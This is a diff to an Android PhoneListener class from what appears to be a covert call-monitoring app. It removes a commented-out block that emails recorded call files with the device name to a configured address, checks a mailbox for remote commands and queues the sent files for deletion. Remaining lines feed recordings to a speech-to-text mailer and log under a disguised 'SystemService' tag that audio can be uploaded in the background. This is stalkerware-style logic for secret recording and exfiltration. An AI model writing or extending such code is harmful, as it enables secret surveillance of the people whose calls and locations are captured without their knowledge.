@@ -177,58 +177,6 @@ public class PhoneListener extends PhoneStateListener {
                                 mRecordDecorder.VoiceDecode(strLastCallNewName, strMailTitle, strMailContent);
                                 strLastCallNewName = "";
                                 /* end 2018.5.7 for SpeechToText */
-
-                                /* comment out 2018.5.7 for SpeechToText
-                                List<String> pathList = new ArrayList<String>();
-                                String strCallContent  = "<br>";
-                                boolean bHasFile = false;
-                                File[] files = new File(CommonParams.path.getAbsolutePath()).listFiles();
-                                for (File file : files) {
-                                    if(file.getName().endsWith(CommonParams.pendingListName)||file.getName().endsWith(CommonParams.cfgFileName)
-                                            ||file.getName().endsWith(CommonParams.GPSinfoFileName)||file.getName().endsWith(CommonParams.GPSinfoPendingListName))
-                                    {
-                                        continue;
-                                    }
-                                    if(file.isFile()) {
-                                        pathList.add(CommonParams.path.getAbsolutePath() + File.separator + file.getName());
-                                        strCallContent += "<br>file:" + CommonParams.path.getAbsolutePath() + File.separator + file.getName();
-                                        if(file.getName().endsWith(".nomedia")==false)
-                                        {
-                                            bHasFile = true;
-                                        }
-                                    }
-                                }
-                                if(bHasFile==false)
-                                {
-                                    strCallContent += "<br>电话未接通,没录上";
-                                }
-                                strCallContent += "<br>Call Record:"+strLastCallNewName;
-                                // 如果接受过更新设备名称的指令，那么在这里更新，确保设备名称正确显示
-                                strMailTitle = strMailTitle.replaceAll(CommonParams.deviceName, CfgParamMgr.getInstance().getMachineName());
-                                strMailContent = strMailContent.replaceAll(CommonParams.deviceName, CfgParamMgr.getInstance().getMachineName());
-                                MailManager.getInstance().sendMailWithMultiFile(strMailTitle+ ".时间"+strLastCallNewName, strMailContent+strCallContent, pathList);
-                                if(CfgParamMgr.getInstance().getGPSserviceFlag()==false)
-                                {
-                                    //如果没开GPS，需要检查命令。如果GPS已经开着，每次上报时会检查命令
-                                    MailManager.getInstance().receiveCommandMail();
-                                }
-                                strLastCallNewName = "";
-                                //加入清除名单
-                                try {
-                                    File file = new File(CommonParams.path, CommonParams.pendingListName);
-                                    OutputStream fos = new FileOutputStream(file);
-                                    OutputStreamWriter osw=new OutputStreamWriter(fos);
-                                    for(int i=0;i<pathList.size();i++)
-                                    {
-                                        osw.write(pathList.get(i));
-                                        osw.write("\r\n");
-                                    }
-                                    osw.flush();
-                                    osw.close();
-                                    fos.close();
-                                } catch (IOException e) {
-                                }
-                                comment out 2018.5.7 for SpeechToText */
                             }
                         }
                         Log.i("SystemService", "音频文件录制完毕，可以在后台上传到服务器");
